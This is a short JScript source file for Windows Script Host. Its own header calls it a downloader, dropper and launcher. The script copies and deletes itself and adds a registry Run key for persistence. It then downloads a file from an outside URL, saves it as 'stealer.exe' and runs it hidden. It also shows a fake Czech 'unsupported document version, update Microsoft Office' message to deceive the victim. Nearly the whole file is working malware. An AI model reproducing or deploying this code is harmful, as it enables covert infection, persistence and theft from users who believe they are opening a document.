/*
 * inconspicuous little JScript WSH .exe downloader/dropper/launcher
 * attachs itself to registry startup key to achieve lame kind of persistence
 *
 * @author Tomáš Keske
 * @since 16.12.2018
 *
 */

var oShell = WScript.CreateObject("WScript.Shell");
var Target = oShell.ExpandEnvironmentStrings("%USERPROFILE%");
var Source = "https://s7386.pcdn.co/wp-content/uploads/2016/07/add-on-direct-link-tracking-771x386.png";
var myKey = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ccc";

        try{

                var regValue = oShell.RegRead(myKey);

        } catch (e) {

                var fso = WScript.CreateObject("Scripting.FileSystemObject");
                fso.CopyFile(WScript.ScriptFullName, Target+"\\launcher.js");
                fso.GetFile(WScript.ScriptFullName).Delete()
                oShell.RegWrite(myKey, "\"%SystemRoot%\\System32\\WScript.exe\" \""+Target+"\\launcher.js\" "+"\" %1\" "+ "%*", "REG_EXPAND_SZ");

                var Object = WScript.CreateObject('MSXML2.XMLHTTP');

                Object.Open('GET', Source, false);
                Object.Send();

                if (Object.Status == 200)
                {
                    var Stream = WScript.CreateObject('ADODB.Stream');

                    Stream.Open();
                    Stream.Type = 1;
                    Stream.Write(Object.ResponseBody);
                    Stream.Position = 0;

                    var File = WScript.CreateObject('Scripting.FileSystemObject');
                    if (File.FileExists(Target + "\\stealer.exe"))
                    {
                        File.DeleteFile(Target + "\\stealer.exe");
                    }

                    Stream.SaveToFile(Target + "\\stealer.exe", 2);
                    Stream.Close();
                }
        }

WshShell = WScript.CreateObject("WScript.Shell");
WshShell.run(Target + "\\stealer.exe", 0,false);
WScript.Echo("Nepodporovana verze dokumentu. "+
                "Pro zobrazeni tohoto souboru aktualizujte balik Microsoft Office.");